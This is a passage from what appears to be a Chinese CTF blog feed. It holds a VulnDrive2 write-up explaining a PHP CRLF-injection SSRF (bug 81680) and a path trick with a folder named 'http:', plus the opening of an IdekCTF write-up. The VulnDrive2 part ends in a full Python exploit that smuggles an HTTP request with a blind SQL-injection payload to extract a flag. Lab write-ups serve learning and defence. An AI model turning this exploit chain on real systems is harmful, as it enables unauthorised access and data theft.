class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">        <span class="variable">$folder</span> = <span class="string">&#x27;./uploads/&#x27;</span>.session_id().<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="variable">$folder</span>)) &#123;</span><br><span class="line">          mkdir(<span class="variable">$folder</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;folder&#x27;</span>] = <span class="variable">$folder</span>;</span><br><span class="line">        header(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no username provided&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来是index.php部分，这里主要有两个功能一个是根据参数new创建文件夹，同时对参数new用check_name函数做了校验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FOLDER</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;folder&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//create new folder inside uploads using get parameter</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(check_name(<span class="variable">$_GET</span>[<span class="string">&quot;new&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$newfolder</span> = <span class="variable">$FOLDER</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="variable">$newfolder</span>)) &#123;</span><br><span class="line">            </span><br><span class="line">            mkdir(<span class="variable">$newfolder</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;folder already exist&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check_name过滤了符号<code>.</code>与<code>/</code>，同时里面还调用了report函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_name</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(gettype(<span class="variable">$filename</span>)===<span class="string">&quot;string&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[.\/]/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            report();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//safe</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//report usename</span></span><br><span class="line">    ini_set(<span class="string">&quot;from&quot;</span>,<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    file_get_contents(<span class="string">&#x27;http://localhost/report.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个是文件上传功能，可以指定path上传文件，不过可惜也经过check_name做了校验，另一点文件名取后缀，并使用uniqid函数获取随机前缀，</p><p>因此我们便不能上传一些配置文件覆盖原来的htaccess下的配置</p><p>同时虽然对后缀没有过滤，由于本身有htaccess下的限制也无法访问到我们上传的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!check_name(<span class="variable">$_POST</span>[<span class="string">&quot;path&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;not allowed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">        <span class="variable">$fileError</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">        <span class="variable">$fileExt</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">        <span class="variable">$fileActualExt</span> = strtolower(end(<span class="variable">$fileExt</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileError</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$fileSize</span> &lt; <span class="number">100000</span>)&#123;</span><br><span class="line">                <span class="variable">$name</span> = uniqid(<span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$fileActualExt</span>;</span><br><span class="line">                <span class="variable">$fileDestination</span> = <span class="variable">$FOLDER</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">                upload(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$fileDestination</span>,<span class="variable">$name</span>);</span><br><span class="line">                header(<span class="string">&quot;Location: index.php?uploadsuccess&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$error</span> =  <span class="string">&quot;Your file is too big!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$error</span> =  <span class="string">&quot;There was an error uploading your file!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$error</span> =  <span class="string">&quot;parameter missing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是view.php，根据参数fol可以查看我们上传的文件名，同时也有check_name做路径限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FOLDER</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;folder&#x27;</span>];</span><br><span class="line"><span class="variable">$dirr</span> = [<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;..&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fol&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//echo $FOLDER.$_GET[&#x27;fol&#x27;];</span></span><br><span class="line">    <span class="keyword">if</span>(check_name(<span class="variable">$_GET</span>[<span class="string">&#x27;fol&#x27;</span>]) &amp;&amp; is_dir(<span class="variable">$FOLDER</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fol&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$files</span> = array_diff(scandir(<span class="variable">$FOLDER</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fol&#x27;</span>]),<span class="variable">$dirr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$c</span>.= <span class="string">&quot;&lt;li class=\&quot;list-group-item\&quot;&gt;&lt;a href=&#x27;/view.php?file=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fol&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;&#x27;&gt;<span class="subst">$f</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> str_replace(<span class="string">&quot;CONTENT&quot;</span>,<span class="variable">$c</span>,<span class="variable">$files_template</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;folder not found&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据参数file可以查看对应的文件内容，不过有限制只能读取后缀为txt、png与jpg后缀的文件</p><p>如果注意看可以看到这里type的写法有点小问题给了我们操作的空间 ，后面会提到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$ext</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$type</span> = substr(strtolower(end(<span class="variable">$ext</span>)),<span class="number">0</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$FOLDER</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span>===<span class="string">&quot;txt&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">                chdir(<span class="variable">$FOLDER</span>);</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$th</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$type</span>===<span class="string">&quot;png&quot;</span> || <span class="variable">$type</span>===<span class="string">&quot;jpg&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">                chdir(<span class="variable">$FOLDER</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;data:image/<span class="subst">$type</span>;base64,&quot;</span>.base64_encode(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])).<span class="string">&quot;\&quot; &gt;&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$th</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Invaild type&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>既然不能rce，那有什么办法呢？ssrf同时又能控制header</p><p>答案在report函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//report usename</span></span><br><span class="line">    ini_set(<span class="string">&quot;from&quot;</span>,<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    file_get_contents(<span class="string">&#x27;http://localhost/report.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在网上搜索到这个<a href="https://bugs.php.net/bug.php?id=81680">https://bugs.php.net/bug.php?id=81680</a></p><p>从漏洞描述可以看到妥妥的CRLF注入</p><blockquote><p>When we set “From” field by setting ini setting “from”, which is used for “ftp” and “http” file wrapper, it can inject an arbitrary string in the raw socket message.</p><p>Since the injected string can contain CR-LF sequence(\r\n), this can be used to interrupt the flow of FTP stream or injecting/smuggling an outgoing HTTP request.</p></blockquote><p>同时下面还给了一个简洁的例子，从这里可以看到我们注入的Header在最上方，那么岂不是想控制啥控制啥嘞</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123205943728.png" alt="image-20230123205943728"></p><h3 id="为什么不能污染HOST"><a href="#为什么不能污染HOST" class="headerlink" title="为什么不能污染HOST"></a>为什么不能污染HOST</h3><p>然而当我们简单构造好username发过去触发report后会发现什么都没发生</p><p>这里我们先本地测试下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Y4tacker</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    ini_set(<span class="string">&quot;from&quot;</span>,<span class="variable">$username</span>);</span><br><span class="line">    file_get_contents(<span class="string">&#x27;http://ip:1234/report.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    report(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>明明Host当中端口已经变了，为什么还是1234呢？比赛期间就卡在最后一步上，属于是脑抽了一直觉得是本地环境问题2333</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123210807930.png" alt="image-20230123210807930"></p><p>实际上在比赛后，经过简单的php源码调试我们可以发现</p><p>事实上其实在发送数据前，php已经根据我们的url与对应ip和port建立好了连接</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123211513054.png" alt="image-20230123211513054"></p><p>之后再发送完整数据包</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123211618350.png" alt="image-20230123211618350"></p><p>因此不论我们如何污染Host都是在原有的tcp连接上进行的通信</p><p>那我们怎么办呢？虽然能成功CRLF注入，但如何控制HOST呢？</p><h3 id="成功的SSRF-尝试"><a href="#成功的SSRF-尝试" class="headerlink" title="成功的SSRF 尝试"></a>成功的SSRF 尝试</h3><p>纵观全局所有代码，我们只能看到view.php当中存在可控制的点</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123211818401.png" alt="image-20230123211818401"></p><p>还记得我们之前说这个获取$type存在问题么？</p><p>乍一看这里逻辑本来是判断后缀后，判断文件是否存在之后再读取，看着没什么问题呀？</p><p>而问题就在于这个type是取<code>.</code>后的三个字符</p><p>那么如果我们创建一个名为<code>http:</code>的文件夹</p><p>之后让file值等于<code>http://xxx.xxx.xxx.txt@waf</code>，这样看也许不明显，那如果我们看看绝对路径呢？</p><p><code>/var/www/html/uploads/sessionid/http://xxx.xxx.xxx.txt@waf</code></p><p>我们知道php通常会做路径标准化，<code>//</code>会被替换成<code>/</code>，那么这个路径</p><p><code>/var/www/html/uploads/sessionid/http:/xxx.xxx.xxx.txt@waf</code></p><p>这样也就能通过<code>file_exists</code>函数了</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>因此我们结合完整攻击路径将以上步骤串联起来写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;input url&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">search_strs = string.printable</span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> search_str <span class="keyword">in</span> search_strs:</span><br><span class="line">        payload = <span class="string">f&quot;user=<span class="subst">&#123;search_str&#125;</span>&#x27;,substr((select * from flag),<span class="subst">&#123;i&#125;</span>,1))--&quot;</span></span><br><span class="line">        username = <span class="string">f&quot;Hi\r\nX_pro-hacker: Pro-hacker\r\nflag: \r\nflag: gimme\r\nToken: <span class="subst">&#123;search_str&#125;</span>\r\nContent-Type:application/x-www-form-urlencoded\r\nHost: waf\r\nContent-Length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>\r\n\r\n<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        sess.post(url + <span class="string">&quot;/login.php&quot;</span>,</span><br><span class="line">                  data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;)</span><br><span class="line">        sess.get(url + <span class="string">&#x27;/index.php?new=http%3A&amp;submit=Upload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sess.post(url + <span class="string">&#x27;/index.php&#x27;</span>, files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.txt@waf&#x27;</span>, <span class="string">&quot;&quot;</span>.encode()),</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;http:&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;submit&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;submit&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        file_name = re.findall(<span class="string">&#x27;&lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=\&#x27;(.*?)\&#x27;&gt;.*?&lt;/a&gt;&lt;/li&gt;&#x27;</span>,</span><br><span class="line">                               sess.get(url + <span class="string">&quot;/view.php?fol=http:&quot;</span>).text)[-<span class="number">1</span>].replace(<span class="string">&quot;http:/&quot;</span>, <span class="string">&quot;http://&quot;</span>)</span><br><span class="line"></span><br><span class="line">        find = sess.get(url + <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>&amp;fol=/&quot;</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;INDEX&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> find:</span><br><span class="line">            flag += search_str</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PHP </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023IdekCTFWriteup</title>
      <link href="/2023/01/16/year/2023/1/2023IdekCTFWriteup/"/>
      <url>/2023/01/16/year/2023/1/2023IdekCTFWriteup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2023-IdekCTF-Writeup"><a href="#2023-IdekCTF-Writeup" class="headerlink" title="2023 IdekCTF Writeup"></a>2023 IdekCTF Writeup</h1><p>由于对xss不是很懂所以一般都是做的非xss部分，很高兴最终被强大的队友带飞下拿到第二名</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173517438.png" alt="image-20230117173517438"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>环境可以在我的仓库下，备份了Dockerfile，可以本地搭建自己学习</p><p><a href="https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF</a></p><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><p>一个python写的好看的TODO LIST</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117173610393.png" alt="image-20230117173610393"></p><p>那么我们具体来看看如何实现，这里重点看，通过json传入task与status两个参数，不同参数条件进入不同分支，通过tasks对象实现了基本的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/manage_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manage_tasks</span>():</span></span><br><span class="line">    task, status = request.json.get(<span class="string">&#x27;task&#x27;</span>), request.json.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> task <span class="keyword">or</span> <span class="built_in">type</span>(task) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;You must provide a task name as a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(task) &gt; <span class="number">150</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Tasks may not be over 150 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> status <span class="keyword">and</span> <span class="built_in">len</span>(status) &gt; <span class="number">50</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Statuses may not be over 50 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> status:</span><br><span class="line">            tasks.complete(task)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span 